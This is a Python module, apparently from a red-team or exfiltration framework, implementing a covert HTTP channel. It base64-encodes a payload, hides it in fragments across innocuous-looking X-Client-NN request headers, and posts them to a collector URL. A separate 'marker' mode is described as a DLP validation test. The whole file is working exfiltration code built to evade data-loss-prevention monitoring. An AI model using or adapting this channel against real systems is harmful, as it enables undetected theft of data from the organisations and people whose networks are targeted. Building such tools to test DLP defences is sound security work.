"""قناة HTTP خفية: الحمولة المشفرة تُوزَّع على رؤوس بريئة المظهر.

الوضعان:
  marker  — رأس X-Swarm-Exfil برقم الشريحة (اختبار تحقق DLP سريع)
  stealth — توزيع base64 على رؤوس X-Client-NN + عدّاد X-Client-Protocol
"""
import base64


class HTTPChannel:
    def __init__(self, transport, mode: str = "stealth", chunk: int = 32):
        self.transport = transport
        self.mode = mode
        self.chunk = chunk

    def encode_headers(self, payload: bytes, base_headers: dict | None = None) -> dict:
        b64 = base64.b64encode(payload).decode()
        h = dict(base_headers or {})
        if self.mode == "marker":
            h["X-Swarm-Exfil"] = b64
        else:
            pieces = [b64[i:i + self.chunk] for i in range(0, len(b64), self.chunk)]
            for i, p in enumerate(pieces):
                h[f"X-Client-{i:02d}"] = p
            h["X-Client-Protocol"] = f"v{len(pieces):02d}"
        return h

    @staticmethod
    def decode_headers(headers: dict) -> bytes:
        if "X-Swarm-Exfil" in headers:
            return base64.b64decode(headers["X-Swarm-Exfil"])
        n = int(headers.get("X-Client-Protocol", "v00")[1:])
        b64 = "".join(headers.get(f"X-Client-{i:02d}", "") for i in range(n))
        return base64.b64decode(b64)

    async def send(self, payload: bytes, collector_url: str) -> dict:
        hdrs = self.encode_headers(payload)
        resp = await self.transport.post(collector_url, headers=hdrs, data=b"")
        return {"status": resp.status, "elapsed": resp.elapsed}
